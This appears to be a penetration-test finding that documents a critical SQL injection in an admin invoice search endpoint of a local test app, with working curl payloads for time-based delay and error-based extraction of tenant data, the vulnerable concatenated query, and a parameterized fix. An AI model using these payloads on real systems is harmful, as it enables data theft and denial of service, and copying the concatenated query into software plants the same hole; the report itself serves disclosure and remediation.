# V-12 — SQL Injection in Admin Search

| Field | Value |
|---|---|
| **Severity** | Critical (CVSS 9.8) |
| **CWE** | CWE-89 — SQL Injection |
| **Endpoint** | `GET /api/v1/admin/search` |
| **Component** | `target-app/src/admin/routes.js` |
| **Status** | Confirmed exploitable |

## Summary
The admin invoice search endpoint concatenates the user-supplied `q` parameter directly into the SQL query. This allows any authenticated user to execute arbitrary SQL commands, extract sensitive data via error-based oracles, and cause Denial of Service (DoS).

## Evidence
1. Baseline (no injection): 
   curl -s -H "Authorization: Bearer $TOKEN_A" --data-urlencode "q=INV" -G "localhost:3000/api/v1/admin/search"
   Returns 200 in approx 30ms.

2. Time-based blind DoS:
   curl -s -H "Authorization: Bearer $TOKEN_A" --data-urlencode "q=x%' OR (SELECT 1 FROM pg_sleep(5)) = 1--" -G "localhost:3000/api/v1/admin/search"
   Response is delayed by approx 5000ms.

3. Error-based data extraction:
   curl -s -H "Authorization: Bearer $TOKEN_A" --data-urlencode "q=x%' OR 1=CAST((SELECT number FROM invoices WHERE tenant_id='a0000001-0000-4000-8000-000000000001' LIMIT 1) AS INTEGER)--" -G "localhost:3000/api/v1/admin/search" | jq .
   Returns a 500 error leaking tenant data: invalid input syntax for type integer: "INV-A-1001".

## Root Cause
The admin/routes.js file uses string concatenation instead of parameterized queries:
const sql = `SELECT id, number, amount_cents, status FROM invoices WHERE number LIKE '%${q}%' ORDER BY created_at DESC LIMIT 50`;
await client.query(sql);

## Fix
Use parameterized queries:
const { rows } = await client.query(
  `SELECT id, number, amount_cents, status FROM invoices WHERE number LIKE $1 ORDER BY created_at DESC LIMIT 50`,
  [`%${q}%`]
);
Also fix V-15 (Information Disclosure) by removing `detail: e.message` from the catch block.
